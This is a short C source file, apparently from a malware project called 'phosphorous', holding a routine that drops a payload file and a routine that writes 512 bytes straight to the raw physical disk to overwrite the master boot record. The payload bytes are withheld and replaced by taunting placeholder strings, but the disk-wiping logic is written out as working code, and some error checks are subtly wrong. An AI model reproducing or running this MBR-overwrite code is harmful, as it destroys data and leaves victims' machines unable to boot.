#include "phosphorous.h"

//oh and yeah no binaries here keep looking
//put this in a diff file because this is a very ugly array
DWORD CDECL DropExplorerPayload(LPCWSTR lpPath) {
	const static BYTE lpFile[] =  "lol no binaries 4 u";
	HANDLE hFile;
	DWORD dwRet;

	hFile = CreateFileW(lpPath, FILE_WRITE_ACCESS, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
	if (!hFile) return GetLastError();
	if (!WriteFile(hFile, lpFile, sizeof(lpFile), &dwRet, NULL) && GetLastError() != ERROR_IO_PENDING) 
		return GetLastError();
	CloseHandle(hFile);
	return 0;
}
//returns 0 on success, 1 on faulure
BOOLEAN WriteMBR() {
	const static BYTE lpMBR[] = "if you want it compile it yourself";
	DWORD dwReturns;
	HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDisk0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (!hDisk) return 1;
	WriteFile(hDisk, lpMBR, 512, &dwReturns, NULL);
	return dwReturns != 512;
}